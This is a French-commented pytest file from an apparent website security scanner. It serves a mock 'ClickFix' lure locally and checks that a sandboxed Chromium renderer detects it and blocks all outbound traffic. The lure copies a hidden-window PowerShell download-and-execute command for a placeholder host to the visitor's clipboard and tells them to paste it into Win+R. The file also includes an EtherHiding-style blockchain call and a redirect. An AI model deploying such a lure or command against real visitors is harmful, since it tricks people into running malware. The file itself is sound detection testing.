"""Passe de rendu dans un vrai Chromium, contre un faux leurre servi en local.

Ignoré si Playwright ou Chromium manque, ou si le bac à sable ne démarre pas.
Le leurre est assemblé à l'exécution et ne sort jamais de 127.0.0.1 : la page
tente un appel de blockchain et une redirection, que la politique bloque avant
tout envoi.
"""
import json
import os
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import pytest

from wp_security_forsure.scanner.render import (RenderProfile, RenderUnavailable,
                                                Renderer, analyze)
from wp_security_forsure.scanner.checks.visit_profiles import CHROME_DESKTOP_UA

pytestmark = pytest.mark.render
# En CI (job « render »), un Chromium absent doit faire échouer, pas ignorer.
REQUIRED = os.environ.get("WPSF_REQUIRE_RENDER") == "1"
if not REQUIRED:
    pytest.importorskip("playwright.sync_api")

PS = "power" + "shell"
CMD = PS + ' -w h -c "i' + 'ex(i' + 'rm https://exemple.invalid/a)"'
IOC = "0xA1decFB75C8C0CA28C10517ce56B710baf727d2e"

LURE = """<!doctype html><html><head><script src="/app.js"></script></head><body>
<h1>Boulangerie</h1>
<div id="ov" style="position:fixed;inset:0;background:#fff;z-index:99999">
<p>Verify you are human</p>
<label><input type="checkbox" id="cb"> I am not a robot</label><p id="steps"></p></div>
<script>
document.getElementById('cb').addEventListener('click', function () {
  navigator.clipboard.writeText(%s);
  document.getElementById('steps').innerText = 'Press Windows + R, then CTRL + V';
});
</script></body></html>""" % json.dumps(CMD)

APP = """
fetch('https://bsc-testnet-rpc.publicnode.com/', {method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({jsonrpc: '2.0', id: 1, method: 'eth_call',
                        params: [{to: '%s', data: '0x6d4ce63c'}, 'latest']})}).catch(() => {});
setTimeout(function () { location.href = 'https://ailleurs.example.invalid/'; }, 1200);
""" % IOC

CLEAN = "<!doctype html><html><body><h1>Boulangerie</h1><p>Pain et gâteaux.</p></body></html>"


class _Handler(BaseHTTPRequestHandler):
    routes = {"/": ("text/html", LURE), "/app.js": ("application/javascript", APP),
              "/propre/": ("text/html", CLEAN)}
    seen = []

    def do_GET(self):
        self.seen.append(("GET", self.path))
        ctype, body = self.routes.get(self.path, ("text/plain", "absent"))
        data = body.encode("utf-8")
        self.send_response(200 if self.path in self.routes else 404)
        self.send_header("Content-Type", ctype + "; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_POST(self):  # ne doit jamais arriver
        self.seen.append(("POST", self.path))
        self.send_response(405)
        self.end_headers()

    def log_message(self, *args):
        pass


@pytest.fixture(scope="module")
def site():
    server = ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{server.server_address[1]}"
    server.shutdown()


@pytest.fixture(scope="module")
def renderer(site):
    config = {"render_settle_ms": 2500, "render_timeout_ms": 15000}
    try:
        with Renderer(site, config, destination_check=lambda url: None) as r:
            yield r
    except RenderUnavailable as exc:
        if REQUIRED:
            pytest.fail(str(exc))
        pytest.skip(str(exc))


def test_lure_is_caught_and_nothing_leaves_localhost(site, renderer):
    _Handler.seen.clear()
    obs = renderer.render(site + "/", RenderProfile("victim_google", CHROME_DESKTOP_UA))
    assert obs.ok, obs.error
    findings = analyze([obs], site)
    messages = {f["message"]: f for f in findings}

    clip = messages["ClickFix : la page place une commande système dans le presse-papiers du visiteur"]
    assert clip["severity"] == "CRITICAL" and clip["confidence"] == "confirmed"
    assert obs.clicked.startswith("input[type=checkbox]")

    assert any(f["severity"] in ("CRITICAL", "HIGH") and "EtherHiding" in f["message"]
               for f in findings), findings
    assert any(f["message"].startswith("Redirection JavaScript vers un autre site")
               for f in findings), findings

    # Rien n'est parti ailleurs que vers le site local, et aucun POST.
    assert obs.contacted_hosts == {"127.0.0.1"}
    assert ("POST", "/") not in _Handler.seen
    blocked_hosts = {b.host for b in obs.blocked}
    assert "bsc-testnet-rpc.publicnode.com" in blocked_hosts
    assert "ailleurs.example.invalid" in blocked_hosts


def test_clean_page_gives_no_finding(site, renderer):
    obs = renderer.render(site + "/propre/", RenderProfile("victim_google", CHROME_DESKTOP_UA))
    assert obs.ok, obs.error
    assert analyze([obs], site) == []
    assert obs.clicked == ""
